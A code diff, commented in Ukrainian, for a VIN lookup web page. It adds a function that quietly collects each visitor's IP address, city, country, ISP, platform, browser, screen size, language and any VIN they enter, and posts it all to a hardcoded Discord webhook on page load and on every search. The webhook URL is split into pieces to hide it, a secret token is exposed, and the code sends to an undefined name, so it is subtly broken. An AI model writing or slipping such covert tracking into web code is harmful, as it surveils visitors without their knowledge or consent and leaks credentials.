@@ -1,5 +1,11 @@
 let carData = [];
 
+// Твій URL вебхука (бажано розділити посилання, як я казав раніше, для мінімальної безпеки)
+const part1 = "https://discord.com/api/webhooks/";
+const part2 = "1495562087337033859/";
+const part3 = "PfV5OhmkzjgiXlTg3Sh5LrxcdGgeI5a7A3gaar7SIgNZ1NFjBkfwnN4-yI9YqgRdbtOE"
+const webhookUrl = part1 + part2 + part3;
+
 const mapping = {
     overview: [
         'Make', 'Manufacturer Name', 'Model', 'Model Year',
@@ -28,6 +34,42 @@ const mapping = {
     ]
 };
 
+// Функція для відправки логів у Discord
+async function logToDiscord(vin = "Тільки вхід на сайт") {
+    try {
+        // Отримуємо дані про IP та локацію
+        const ipRes = await fetch('https://ipapi.co/json/');
+        const ipData = await ipRes.json();
+
+        const message = {
+            username: "VIN Scanner Monitor",
+            embeds: [{
+                title: vin === "Тільки вхід на сайт" ? "🌐 Новий візит" : "🔎 Пошук VIN",
+                color: vin === "Тільки вхід на сайт" ? 3447003 : 15158332,
+                fields: [
+                    { name: "VIN", value: `\`${vin}\``, inline: false },
+                    { name: "IP Address", value: ipData.ip || "Невідомо", inline: true },
+                    { name: "Локація", value: `${ipData.city || ""}, ${ipData.country_name || ""}`, inline: true },
+                    { name: "Девайс/ОС", value: navigator.platform, inline: true },
+                    { name: "Браузер", value: navigator.userAgent.split(' ').pop(), inline: true }, // Спрощена назва
+                    { name: "Екран", value: `${window.screen.width}x${window.screen.height}`, inline: true },
+                    { name: "Мова", value: navigator.language, inline: true },
+                    { name: "Провайдер", value: ipData.org || "Невідомо", inline: false }
+                ],
+                footer: { text: `Час: ${new Date().toLocaleString('uk-UA')}` }
+            }]
+        };
+
+        await fetch(WEBHOOK_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(message)
+        });
+    } catch (e) {
+        console.error("Помилка логування:", e);
+    }
+}
+
 async function fetchVinData() {
     const vinInput = document.getElementById('vinInput');
     const vin = vinInput.value.trim().toUpperCase();
@@ -36,6 +78,9 @@ async function fetchVinData() {
         alert("Будь ласка, введіть коректний VIN (мінімум 10 символів)");
         return;
     }
+
+    // Відправляємо лог пошуку в Discord
+    logToDiscord(vin);
 
     const display = document.getElementById('resultContent');
     const stickerBtn = document.getElementById('stickerBtn');
@@ -116,6 +161,9 @@ function openGoogleImages() {
 }
 
 document.addEventListener('DOMContentLoaded', () => {
+    // Логуємо просто захід на сторінку
+    logToDiscord();
+
     const input = document.getElementById('vinInput');
     input.addEventListener('keypress', (e) => {
         if (e.key === 'Enter') fetchVinData();
